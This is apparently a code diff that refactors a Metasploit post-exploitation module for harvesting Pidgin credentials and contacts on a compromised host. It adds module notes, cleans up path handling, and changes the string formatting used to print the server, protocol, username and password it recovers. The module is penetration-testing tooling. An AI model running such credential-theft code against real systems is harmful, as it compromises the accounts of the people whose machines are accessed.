@@ -36,13 +36,17 @@ class MetasploitModule < Msf::Post
               stdapi_sys_config_getuid
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
     register_options(
       [
         OptBool.new('CONTACTS', [false, 'Collect contact lists?', false]),
-        # Not supported yet OptBool.new('LOGS', [false, 'Gather log files?', false]),
       ]
     )
   end
@@ -85,6 +89,7 @@ class MetasploitModule < Msf::Post
       home = '/home/'
     end
 
+    # @todo use Msf::Post::File
     if got_root?
       userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
       userdirs << "/root\n"
@@ -115,22 +120,21 @@ class MetasploitModule < Msf::Post
   end
 
   def check_pidgin(purpledir)
-    path = ''
     print_status("Checking for Pidgin profile in: #{purpledir}")
+
     session.fs.dir.foreach(purpledir) do |dir|
       if dir =~ /\.purple/
         if @platform == :windows
-          print_status("Found #{purpledir}\\#{dir}")
           path = "#{purpledir}\\#{dir}"
         else
-          print_status("Found #{purpledir}/#{dir}")
           path = "#{purpledir}/#{dir}"
         end
+        print_status("Found #{path}")
         return path
       end
     end
-    return nil
-    endreturn nil
+
+    nil
   end
 
   def get_pidgin_creds(paths)
@@ -272,11 +276,11 @@ class MetasploitModule < Msf::Post
       creds << account
 
       print_status('Collected the following credentials:')
-      print_status('    Server: %s:%s' % [account['server'], account['port']])
-      print_status('    Protocol: %s' % account['protocol'])
-      print_status('    Username: %s' % account['user'])
-      print_status('    Password: %s' % account['password'])
-      print_line('')
+      print_status("    Server: #{account['server']}:#{account['port']}")
+      print_status("    Protocol: #{account['protocol']}")
+      print_status("    Username: #{account['user']}")
+      print_status("    Password: #{account['password']}")
+      print_line
     end
 
     return creds
@@ -313,11 +317,11 @@ class MetasploitModule < Msf::Post
 
         buddies << contact
         print_status('Collected the following contacts:')
-        print_status('    Buddy Name: %s' % contact['name'])
-        print_status('    Alias: %s' % contact['alias'])
-        print_status('    Protocol: %s' % contact['protocol'])
-        print_status('    Account: %s' % contact['account'])
-        print_line('')
+        print_status("    Buddy Name: #{contact['name']}")
+        print_status("    Alias: #{contact['alias']}")
+        print_status("    Protocol: #{contact['protocol']}")
+        print_status("    Account: #{contact['account']}")
+        print_line
       end
     end
 
